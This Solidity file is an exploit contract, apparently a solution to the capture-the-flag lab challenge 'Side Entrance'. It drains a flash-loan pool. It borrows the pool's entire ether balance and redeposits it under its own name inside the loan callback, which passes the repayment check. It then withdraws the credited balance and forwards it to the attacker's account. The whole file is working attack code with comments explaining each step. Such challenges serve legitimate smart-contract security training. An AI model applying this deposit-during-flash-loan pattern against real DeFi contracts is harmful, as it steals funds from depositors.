// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceExploit is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool immutable pool;
    uint256 immutable etherInPool;
    address payable immutable attacker = payable(msg.sender);

    constructor(address _pool, uint256 _etherInPool) {
        pool = ISideEntranceLenderPool(_pool);
        etherInPool = _etherInPool;
    }

    // The function that starts the exploit.
    function pwn() external {
        // Borrow all of it, it's free after all!
        pool.flashLoan(etherInPool);
        // Withdraw our "loan" to this contract.
        pool.withdraw();
        // Give it all to our EOA account.
        attacker.transfer(address(this).balance);
    }

    // The flashloan callback.
    function execute() external payable override {
        // Deposit the loan back into the pool, but under our name.
        pool.deposit{value: msg.value}();
    }

    // Necessary for the withdrawal from the pool.
    receive() external payable {}
}
